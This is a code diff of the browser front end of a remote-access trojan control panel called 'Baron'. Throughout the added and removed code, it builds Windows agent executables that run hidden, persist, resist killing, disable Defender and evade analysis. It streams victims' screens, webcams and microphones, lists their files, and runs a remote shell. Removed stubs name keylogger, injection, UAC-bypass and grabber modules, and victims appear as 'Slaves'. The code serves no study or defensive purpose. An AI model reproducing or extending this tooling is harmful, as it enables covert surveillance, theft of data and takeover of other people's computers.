-  w.style.zIndex = ++zIndexCounter;
-}
-
-function closeWindow(wid) {
-  const w = document.getElementById(wid);
-  if(w) {
-    w.style.transform = 'scale(0.95)'; w.style.opacity = '0';
-    setTimeout(() => w.remove(), 200);
+  if (['screen_start', 'webcam_start', 'audio_start'].includes(payload.action)) {
+    document.getElementById('stream-cid').value = SELECTED_CID;
+    nav(document.querySelector('[data-page="streams"]'), 'streams');
   }
 }
 
-function maxWindow(wid) {
-  const w = document.getElementById(wid);
-  if(!w) return;
-  if(w.dataset.maximized) {
-    w.style.left = w.dataset.x; w.style.top = w.dataset.y;
-    w.style.width = w.dataset.w; w.style.height = w.dataset.h;
-    delete w.dataset.maximized;
+// ── Context Menu
+function showContextMenu(e, cid) {
+  e.preventDefault();
+  SELECTED_CID = cid;
+  const menu = document.getElementById('ctx-menu');
+  document.getElementById('ctx-target').textContent = (CLIENTS[cid]?.hostname || cid).substring(0, 16);
+  menu.classList.add('show');
+  
+  let x = e.clientX;
+  let y = e.clientY;
+  const mx = window.innerWidth - menu.offsetWidth - 10;
+  const my = window.innerHeight - menu.offsetHeight - 10;
+  if(x > mx) x = mx;
+  if(y > my) y = my;
+  menu.style.left = x + 'px';
+  menu.style.top = y + 'px';
+}
+
+function hideCtx() {
+  document.getElementById('ctx-menu').classList.remove('show');
+}
+document.addEventListener('click', hideCtx);
+document.addEventListener('contextmenu', (e) => {
+  if(!e.target.closest('tr')) hideCtx();
+});
+
+async function ctxCmd(action) {
+  hideCtx();
+  if(!SELECTED_CID) return;
+  await sendCommand({action});
+}
+
+
+function appendOut(el, text, color='#a0f0a0') {
+  if (!el) return;
+  const line = document.createElement('div');
+  line.style.color = color; line.textContent = text;
+  el.appendChild(line);
+  el.scrollTop = el.scrollHeight;
+}
+
+async function loadResults() {
+  if (!SELECTED_CID) return;
+  const d = await apiFetch(`/api/panel/results?cid=${SELECTED_CID}`);
+  if (!d || !d.ok) return;
+  const el = document.getElementById('agent-out');
+  if (!el) return;
+  (d.results || []).slice(-20).forEach(r => {
+    appendOut(el, `[${r.type||'?'}] ${JSON.stringify(r.data||'').substring(0,200)}`, '#c0f0c0');
+  });
+}
+
+// ── Streams
+function sendStream(action) {
+  const cid = document.getElementById('stream-cid').value;
+  if (!cid) return alert('Select an agent first');
+  SELECTED_CID = cid;
+  sendCommand({action});
+}
+
+// ── Files
+async function listFiles() {
+  const cid = SELECTED_CID || Object.keys(CLIENTS)[0];
+  if (!cid) return;
+  const path = document.getElementById('file-path').value || 'C:\\';
+  SELECTED_CID = cid;
+  await sendCommand({action:'filelist', path});
+  document.getElementById('file-out').textContent = 'Command sent. Waiting for agent response…';
+}
+
+// ── Builder
+async function buildAgent() {
+  const opts = {
+    server: document.getElementById('b-server').value,
+    name: document.getElementById('b-name').value,
+    beacon: parseInt(document.getElementById('b-beacon').value) || 5000,
+    output_type: document.getElementById('b-type').value,
+    hidden: document.getElementById('b-hidden').checked,
+    persist: document.getElementById('b-persist').checked,
+    anti_kill: document.getElementById('b-antikill').checked,
+    disable_defender: document.getElementById('b-defender').checked,
+    fake_error: document.getElementById('b-fakeerr').checked,
+    anti_analysis: document.getElementById('b-antianalysis').checked,
+    debug: document.getElementById('b-debug').checked,
+  };
+  if (!opts.server) return alert('C2 Server URL required');
+  const r = await apiFetch('/api/panel/build', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify(opts)
+  });
+  if (!r) return;
+  const out = document.getElementById('build-out');
+  const src = document.getElementById('build-src');
+  out.style.display = 'block';
+  if (r.ok) {
+    BUILD_DATA = r;
+    let header = '';
+    if (r.compile_status === 'success') {
+      header = '✅ COMPILED SUCCESSFULLY\n📥 Download: ' + r.download_url + '\n\n';
+    } else if (r.compile_status === 'failed') {
+      header = '❌ COMPILATION FAILED: ' + (r.compile_error || 'Unknown error') + '\n📄 Source code returned below:\n\n';
+    } else {
+      header = '⚠ No compiler on server. Source code (.cs) returned:\n\n';
+    }
+    src.textContent = header + (r.source || '');
   } else {
-    w.dataset.x = w.style.left; w.dataset.y = w.style.top;
-    w.dataset.w = w.style.width; w.dataset.h = w.style.height;
-    w.style.left = '0px'; w.style.top = '0px';
-    w.style.width = '100vw'; w.style.height = 'calc(100vh - 80px)'; // leave dock space
-    w.dataset.maximized = "1";
+    src.textContent = 'Error: ' + (r.error || 'Unknown');
   }
 }
 
-// Drag & Resize Mechanics
-let _dragObj = null, _dragOffset = {x:0, y:0}, _isResize = false;
-function startDrag(e, wid) {
-  if(e.target.closest('.os-controls')) return;
-  _dragObj = document.getElementById(wid); _isResize = false;
-  const rect = _dragObj.getBoundingClientRect();
-  _dragOffset.x = e.clientX - rect.left;
-  _dragOffset.y = e.clientY - rect.top;
-  focusWindow(_dragObj);
-}
-function startResize(e, wid) {
-  _dragObj = document.getElementById(wid); _isResize = true;
-  _dragOffset.startX = e.clientX; _dragOffset.startY = e.clientY;
-  _dragOffset.startW = _dragObj.offsetWidth; _dragOffset.startH = _dragObj.offsetHeight;
-  e.stopPropagation(); focusWindow(_dragObj);
+function clearBuildOut() {
+  document.getElementById('build-out').style.display = 'none';
+  document.getElementById('build-src').textContent = '';
+  BUILD_DATA = null;
 }
 
-document.addEventListener('mousemove', e => {
-  if(!_dragObj) return;
-  if(_isResize) {
-    const w = _dragOffset.startW + (e.clientX - _dragOffset.startX);
-    const h = _dragOffset.startH + (e.clientY - _dragOffset.startY);
-    _dragObj.style.width = Math.max(300, w) + 'px';
-    _dragObj.style.height = Math.max(200, h) + 'px';
+async function downloadBuild() {
+  if (!BUILD_DATA) return;
+  if (BUILD_DATA.download_url) {
+    // Download compiled .exe via fetch with auth token
+    try {
+      const resp = await fetch(BUILD_DATA.download_url, {
+        headers: {'X-Token': TOKEN}
+      });
+      if (!resp.ok) { alert('Download failed: ' + resp.status); return; }
+      const blob = await resp.blob();
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = (BUILD_DATA.name||'agent') + '.exe';
+      a.click();
+      URL.revokeObjectURL(a.href);
+    } catch(e) { alert('Download error: ' + e); }
   } else {
-    _dragObj.style.left = (e.clientX - _dragOffset.x) + 'px';
-    _dragObj.style.top = (e.clientY - _dragOffset.y) + 'px';
+    // Download .cs source
+    const blob = new Blob([BUILD_DATA.source || ''], {type:'text/plain'});
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob); a.download = (BUILD_DATA.name||'agent') + '.cs'; a.click();
+  }
+}
+
+
+// ── Socket.IO
+function initSocket() {
+  try {
+    socket = io({auth:{token:TOKEN}});
+    socket.emit('auth', {token:TOKEN});
+    
+    let audioCtx = null;
+    
+    socket.on('stream_frame', d => {
+      if (d.type === 'screen') {
+          const el = document.getElementById('screen-frame');
+          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+      } else if (d.type === 'webcam') {
+          const el = document.getElementById('webcam-frame');
+          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+      }
+    });
+    
+    socket.on('audio_chunk', async d => {
+      try {
+        if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if(audioCtx.state === 'suspended') await audioCtx.resume();
+        const binary = atob(d.data); const len = binary.length; const bytes = new Uint8Array(len);
+        for (let i=0; i<len; i++) bytes[i] = binary.charCodeAt(i);
+        const aBuf = await audioCtx.decodeAudioData(bytes.buffer);
+        const src = audioCtx.createBufferSource(); src.buffer = aBuf; src.connect(audioCtx.destination); src.start(0);
+      } catch(e) { console.error("Audio play error", e); }
+    });
+
+    socket.on('result', d => {
+      const el = document.getElementById('agent-out');
+      if (el && d.cid === SELECTED_CID) appendOut(el, `[${d.type}] ${JSON.stringify(d.data||'').substring(0,300)}`);
+    });
+  } catch(e) {}
+}
+
+// ── Navigation
+function nav(el, page) {
+  document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+  el.classList.add('active');
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(`page-${page}`).classList.add('active');
+  document.getElementById('pg-title').textContent = el.textContent.trim();
+  if (page === 'logs') fetchLogs();
+}
+
+// ── Modal
+function showModal() { document.getElementById('modal-overlay').classList.add('show'); }
+function closeModal() { document.getElementById('modal-overlay').classList.remove('show'); SELECTED_CID = null; }
+
+// ── Enter to login
+document.querySelectorAll('#u,#p').forEach(el => el.addEventListener('keydown', e => { if(e.key==='Enter') doLogin(); }));
+
+// ── Drag & Drop (Masonry Modular Layout)
+document.addEventListener('DOMContentLoaded', () => {
+  const statsContainer = document.querySelector('.stats-grid');
+  if(statsContainer) {
+    let draggedItem = null;
+    let savedOrder = null;
+    try { savedOrder = JSON.parse(localStorage.getItem('baron-stats-order')); }catch(e){}
+    
+    // Restore order if saved
+    if(savedOrder && Array.isArray(savedOrder)) {
+      const stats = [...statsContainer.querySelectorAll('.stat')];
+      savedOrder.forEach(id => {
+        const el = stats.find(s => s.querySelector('.stat-val') && s.querySelector('.stat-val').id === id);
+        if(el) statsContainer.appendChild(el);
+      });
+    }
+
+    statsContainer.querySelectorAll('.stat').forEach(stat => {
+      stat.setAttribute('draggable', true);
+      stat.addEventListener('dragstart', function(e) {
+        draggedItem = this;
+        setTimeout(() => this.style.opacity = '0.4', 0);
+      });
+      stat.addEventListener('dragend', function() {
+        setTimeout(() => {
+          this.style.opacity = '1';
+          draggedItem = null;
+          // save order
+          const newOrder = [...statsContainer.querySelectorAll('.stat-val')].map(el => el.id);
+          localStorage.setItem('baron-stats-order', JSON.stringify(newOrder));
+        }, 0);
+      });
+      stat.addEventListener('dragover', e => e.preventDefault());
+      stat.addEventListener('dragenter', function(e) { e.preventDefault(); this.style.transform = 'scale(1.05)'; });
+      stat.addEventListener('dragleave', function() { this.style.transform = ''; });
+      stat.addEventListener('drop', function() {
+        this.style.transform = '';
+        if (draggedItem && this !== draggedItem) {
+          let all = [...statsContainer.querySelectorAll('.stat')];
+          let draggedIdx = all.indexOf(draggedItem);
+          let droppedIdx = all.indexOf(this);
+          if(draggedIdx < droppedIdx) this.parentNode.insertBefore(draggedItem, this.nextSibling);
+          else this.parentNode.insertBefore(draggedItem, this);
+        }
+      });
+    });
   }
 });
-document.addEventListener('mouseup', () => { _dragObj = null; });
 
-// --- APPS ---
-const APPS = {
-  dashboard: {
-    id: 'app-dashboard', title: 'Baron Dashboard',
-    html: `
-      <div class="dash-grid">
-        <div class="dash-card"><div class="dash-val" id="d-total">0</div><div class="dash-lbl">Total Slaves</div></div>
-        <div class="dash-card"><div class="dash-val" id="d-online" style="color:var(--success);">0</div><div class="dash-lbl">Online</div></div>
-        <div class="dash-card" style="grid-column: 1 / -1;"><div class="dash-val" id="d-tasks">0</div><div class="dash-lbl">Pending Tasks</div></div>
-      </div>
-    `,
-    onInit: () => updateDashboardView()
-  },
-  network: {
-    id: 'app-network', title: 'Network Overseer', width: 700, height: 400,
-    html: `
-      <table>
-        <thead><tr><th>Status</th><th>ID</th><th>Host \\ User</th><th>OS</th><th>Version</th></tr></thead>
-        <tbody id="agent-list"></tbody>
-      </table>
-    `,
-    onInit: () => updateNetworkView()
-  },
-  builder: {
-    id: 'app-builder', title: 'Forge Payload', width: 650, height: 450,
-    html: `
-      <div class="builder-grid">
-        <div class="builder-section">
-          <h3>Connection</h3>
-          <div class="b-row"><label>Server URL</label><input type="text" id="b-sv" value="https://example.com"></div>
-          <div class="b-row"><label>Beacon Interval (ms)</label><input type="number" id="b-beacon" value="5000"></div>
-          <div class="b-row"><label>Anti-Analysis</label><select id="b-aa"><option value="true">Enabled</option><option value="false">Disabled</option></select></div>
-        </div>
-        <div class="builder-section">
-          <h3>Stealth / Install</h3>
-          <div class="b-row"><label>Process Name</label><input type="text" id="b-proc" value="svchost.exe"></div>
-          <div class="b-row"><label>Melt (Self-Delete)</label><select id="b-melt"><option value="false">No</option><option value="true">Yes</option></select></div>
-          <div class="b-row"><label>Persistence</label><select id="b-pers"><option value="true">Enabled</option><option value="false">Disabled</option></select></div>
-          <div class="b-row"><label>Anti-Kill (Critical Process)</label><select id="b-kill"><option value="false">Disabled</option><option value="true">Enabled</option></select></div>
-        </div>
-      </div>
-      <div style="text-align:right; margin-top:20px;">
-        <button class="gold-btn" style="padding: 10px 30px;" onclick="buildAgent()">FORGE AGENT</button>
-      </div>
-      <p id="b-status" style="margin-top:10px; color:var(--highlight);"></p>
-    `
-  },
-  telemetry: {
-    id: 'app-telemetry', title: 'System Telemetry', width: 500, height: 400,
-    html: `<div id="log-container" style="height:100%; overflow:auto; display:flex; flex-direction:column-reverse;"></div>`,
-    onInit: () => updateTelemetryView(true)
-  }
-};
-
-function openApp(appName, customOpts={}) {
-  const app = APPS[appName];
-  createWindow({ ...app, ...customOpts });
-}
-
-// APP LOGIC
-function updateDashboardView() {
-  if(!document.getElementById('d-total')) return;
-  const vals = Object.values(STATE.clients);
-  document.getElementById('d-total').textContent = vals.length;
-  document.getElementById('d-online').textContent = vals.filter(c => c.online).length;
-}
-
-function updateNetworkView() {
-  const tbody = document.getElementById('agent-list');
-  if(!tbody) return;
-  tbody.innerHTML = '';
-  Object.values(STATE.clients).forEach(c => {
-    const tr = document.createElement('tr');
-    tr.className = 'agent-row';
-    tr.innerHTML = `
-      <td><span class="status-dot ${c.online?'':'offline'}"></span>${c.online?'Online':'Offline'}</td>
-      <td style="font-family:var(--font-mono); color:var(--highlight);">${c.id.substr(0,8)}</td>
-      <td>${c.hostname} \\ ${c.username}</td>
-      <td>${c.os}</td>
-      <td>${c.version}</td>
-    `;
-    tr.oncontextmenu = (e) => showCtx(e, c);
-    tbody.appendChild(tr);
-  });
-}
-
-function updateTelemetryView(autoScroll=false) {
-  const cont = document.getElementById('log-container');
-  if(!cont) return;
-  let html = '';
-  // Reverse loop since column-reverse displays bottom up
-  let revLogs = [...STATE.logs].reverse();
-  revLogs.forEach(l => {
-    let typeClass = 'log-info';
-    if(l.includes('Failed') || l.includes('warn')) typeClass = 'log-warn';
-    if(l.includes('Error') || l.includes('FATAL') || l.includes('Exception')) typeClass = 'log-err';
-    if(l.includes('Command')) typeClass = 'log-cmd';
-    
-    // Attempt parse time "HH:MM:SS - "
-    let t = '', m = l;
-    if(/^[0-9]{2}:[0-9]{2}:[0-9]{2}/.test(l)) {
-      t = l.substr(0,8); m = l.substr(11);
-    }
-    html += `<div class="log-line"><span class="log-time">[${t}]</span><span class="${typeClass}">${m}</span></div>`;
-  });
-  cont.innerHTML = html;
-}
-
-async function buildAgent() {
-  const st = document.getElementById('b-status');
-  st.textContent = "Forging payload...";
-  const req = {
-    server: document.getElementById('b-sv').value,
-    process_name: document.getElementById('b-proc').value,
-    beacon: parseInt(document.getElementById('b-beacon').value),
-    anti_analysis: document.getElementById('b-aa').value === 'true',
-    persistence: document.getElementById('b-pers').value === 'true',
-    melt: document.getElementById('b-melt').value === 'true',
-    anti_kill: document.getElementById('b-kill').value === 'true',
-    debug: false
-  };
-  const res = await api('/api/panel/build', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(req) });
-  if (res && res.ok && res.compile_status==='success') {
-    st.textContent = "SUCCESS. Downloading...";
-    const fb = await fetch(res.download_url, {headers:{'X-Token':TOKEN}});
-    if(fb.ok) {
-      const a=document.createElement('a'); a.href=URL.createObjectURL(await fb.blob()); a.download=(res.name||'agent')+'.exe'; a.click();
-    }
-  } else {
-    st.textContent = "FAILED: " + (res?res.error:'Unknown Error');
-  }
-}
-
-// --- CONTEXT MENU & 15 MODS ---
-document.addEventListener('click', () => { document.getElementById('ctx-menu').style.display='none'; });
-
-function showCtx(e, c) {
-  e.preventDefault();
-  selectedAgent = c;
-  const ctx = document.getElementById('ctx-menu');
-  document.getElementById('ctx-agent-id').textContent = `Agent: ${c.hostname}`;
-  ctx.style.display = 'block';
-  ctx.style.left = e.clientX + 'px';
-  ctx.style.top = e.clientY + 'px';
-  
-  // Boundary check
-  if(e.clientX + ctx.offsetWidth > window.innerWidth) ctx.style.left = (window.innerWidth - ctx.offsetWidth) + 'px';
-  if(e.clientY + ctx.offsetHeight > window.innerHeight) ctx.style.top = (window.innerHeight - ctx.offsetHeight) + 'px';
-}
-
-function tSend(action, params={}) {
-  if(!selectedAgent) return;
-  api('/api/panel/task', {
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({id: selectedAgent.id, action: action, ...params})
-  });
-}
-
-function ctxAction(mod) {
-  if(!selectedAgent) return;
-  const id = selectedAgent.id;
-
-  switch(mod) {
-    case 'screen':
-      createWindow({
-        title: `Screen Feed [${id.substr(0,6)}]`, width:800, height:600,
-        html: `
-          <div class="stream-wrapper">
-            <img class="stream-obj" id="stream-img-${id}" src="" alt="Awaiting Stream...">
-            <div class="stream-ctrl">
-              <button class="gold-btn" onclick="tSend('screen_start', {qual:50})">Start Stream</button>
-              <button onclick="tSend('screen_stop')">Stop</button>
-            </div>
-          </div>
-        `
-      });
-      break;
-
-    case 'webcam':
-      createWindow({
-        title: `Webcam Feed [${id.substr(0,6)}]`, width:640, height:480,
-        html: `
-          <div class="stream-wrapper">
-            <img class="stream-obj" id="stream-img-${id}" src="" alt="Awaiting Webcam Feed...">
-            <div class="stream-ctrl">
-              <button class="gold-btn" onclick="tSend('webcam_start')">Start Camera</button>
-              <button onclick="tSend('webcam_stop')">Stop</button>
-            </div>
-          </div>
-        `
-      });
-      break;
-
-    case 'mic':
-      tSend('audio_start', {dur:10});
-      createWindow({
-        title: `Audio Dump [${id.substr(0,6)}]`, width:400, height:200,
-        html: `<div style="text-align:center; padding:20px; color:var(--highlight);"><p>Microphone task scheduled.</p><p>Check Telemetry logs for download link when complete.</p></div>`
-      });
-      break;
-
-    case 'shell':
-      const winId = 'term_' + id;
-      createWindow({
-        id: winId, title: `Secure Shell [${id.substr(0,6)}]`, width:700, height:500,
-        html: `
-          <div class="term-container">
-            <div class="term-output" id="out-${winId}">[BARON SECURE SHELL] Connection established.\nType a command and press Enter.\n</div>
-            <div class="term-input">
-              <span>PS ></span>
-              <input type="text" id="inp-${winId}" autocomplete="off" onkeydown="cmdHandle(event, '${id}', '${winId}')">
-            </div>
-          </div>
-        `,
-        onInit: () => setTimeout(()=>document.getElementById(`inp-${winId}`).focus(), 100)
-      });
-      break;
-
-    case 'grabber':
-    case 'files':
-    case 'clipboard':
-    case 'regedit':
-    case 'processes':
-    case 'netstat':
-    case 'power':
-    case 'inject':
-    case 'defender':
-    case 'uac':
-    case 'keylogger':
-      // Currently stubbing out advanced modules requiring C# rewrites
-      createWindow({
-        title: `${mod.toUpperCase()} Module [${id.substr(0,6)}]`, width:400, height:250,
-        html: `
-          <div style="text-align:center; padding:30px;">
-            <h2 style="color:var(--highlight); font-family:var(--font-serif); margin-bottom:15px;">Module Payload</h2>
-            <p style="color:var(--text-dim); margin-bottom: 20px;">Deploying <b>${mod}</b> to agent memory.</p>
-            <button class="gold-btn" onclick="tSend('${mod}')">EXECUTE TASK</button>
-          </div>
-        `
-      });
-      break;
-  }
-}
-
-// Shell logic
-function cmdHandle(e, agentId, winId) {
-  if(e.key==='Enter') {
-    const v = e.target.value; e.target.value = '';
-    const out = document.getElementById(`out-${winId}`);
-    out.textContent += `PS > ${v}\n`;
-    out.scrollTop = out.scrollHeight;
-    api('/api/panel/task', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:agentId, action:'exec', cmd:v}) });
-  }
-}
 </script>
 </body>
 </html>
